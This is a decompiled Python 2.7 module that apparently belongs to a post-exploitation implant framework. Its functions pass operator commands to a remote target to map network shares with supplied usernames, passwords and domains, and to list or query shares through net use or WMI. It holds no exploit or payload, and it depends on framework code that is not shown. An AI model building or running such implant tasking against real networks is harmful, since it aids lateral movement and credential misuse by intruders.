# uncompyle6 version 2.9.10
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.10 (default, Feb  6 2017, 23:53:20) 
# [GCC 4.2.1 Compatible Apple LLVM 8.0.0 (clang-800.0.34)]
# Embedded file name: Mcl_Cmd_Shares_Tasking.py
_CMD_MAP = 1
_CMD_LIST = 2
_CMD_QUERY = 3
_NET_USE = 1
_WMI = 2

def TaskingMain(namespace):
    import mcl.tasking
    lpParams = mcl.tasking.GetParameters()
    if lpParams['command'] == _CMD_MAP:
        return _lpSharesMap(namespace, lpParams)
    else:
        if lpParams['command'] == _CMD_LIST:
            return _lpSharesList(namespace, lpParams)
        if lpParams['command'] == _CMD_QUERY:
            return _lpSharesQuery(namespace, lpParams)
        mcl.tasking.OutputError('Invalid command')
        return False


def _lpSharesList(namespace, lpParams):
    import mcl.imports
    import mcl.target
    import mcl.tasking
    mcl.imports.ImportWithNamespace(namespace, 'mca.network.cmd.shares', globals())
    mcl.imports.ImportWithNamespace(namespace, 'mca.network.cmd.shares.tasking', globals())
    rpc = mca.network.cmd.shares.tasking.RPC_INFO_LIST
    rpc.SetMessagingType('message')
    res = mcl.tasking.RpcPerformCall(rpc)
    if res != mcl.target.CALL_SUCCEEDED:
        mcl.tasking.RecordModuleError(res, 0, mca.network.cmd.shares.errorStrings)
        return False
    return True


def _lpSharesMap(namespace, lpParams):
    import mcl.imports
    import mcl.target
    import mcl.tasking
    from mcl.object.Message import MarshalMessage
    mcl.imports.ImportWithNamespace(namespace, 'mca.network.cmd.shares', globals())
    mcl.imports.ImportWithNamespace(namespace, 'mca.network.cmd.shares.tasking', globals())
    if lpParams['target'] == None or len(lpParams['target']) == 0:
        mcl.tasking.OutputError('A target must be specified')
        return False
    else:
        if lpParams['resource'] == None or len(lpParams['resource']) == 0:
            mcl.tasking.OutputError('A resource must be specified')
            return False
        tgtParams = mca.network.cmd.shares.ParamsMap()
        tgtParams.target = lpParams['target']
        tgtParams.resource = lpParams['resource']
        tgtParams.drive = lpParams['drive']
        tgtParams.username = lpParams['username']
        tgtParams.password = lpParams['password']
        tgtParams.domain = lpParams['domain']
        rpc = mca.network.cmd.shares.tasking.RPC_INFO_MAP
        msg = MarshalMessage()
        tgtParams.Marshal(msg)
        rpc.SetData(msg.Serialize())
        rpc.SetMessagingType('message')
        res = mcl.tasking.RpcPerformCall(rpc)
        if res != mcl.target.CALL_SUCCEEDED:
            mcl.tasking.RecordModuleError(res, 0, mca.network.cmd.shares.errorStrings)
            return False
        return True


def _lpSharesQuery(namespace, lpParams):
    import mcl.imports
    import mcl.target
    import mcl.tasking
    from mcl.object.Message import MarshalMessage
    mcl.imports.ImportWithNamespace(namespace, 'mca.network.cmd.shares', globals())
    mcl.imports.ImportWithNamespace(namespace, 'mca.network.cmd.shares.tasking', globals())
    tgtParams = mca.network.cmd.shares.ParamsQuery()
    tgtParams.domain = lpParams['domain']
    tgtParams.password = lpParams['password']
    tgtParams.target = lpParams['target']
    tgtParams.username = lpParams['username']
    if tgtParams.target == None or len(tgtParams.target) == 0:
        tgtParams.target = '127.0.0.1'
    if lpParams['method'] == _NET_USE:
        rpc = mca.network.cmd.shares.tasking.RPC_INFO_QUERY
    elif lpParams['method'] == _WMI:
        rpc = mca.network.cmd.shares.tasking.RPC_INFO_QUERY_WMI
    else:
        mcl.tasking.OutputError('Invalid method')
        return False
    msg = MarshalMessage()
    tgtParams.Marshal(msg)
    rpc.SetData(msg.Serialize())
    rpc.SetMessagingType('message')
    res = mcl.tasking.RpcPerformCall(rpc)
    if res != mcl.target.CALL_SUCCEEDED:
        mcl.tasking.RecordModuleError(res, 0, mca.network.cmd.shares.errorStrings)
        return False
    else:
        return True


if __name__ == '__main__':
    import sys
    if TaskingMain(sys.argv[1]) != True:
        sys.exit(-1)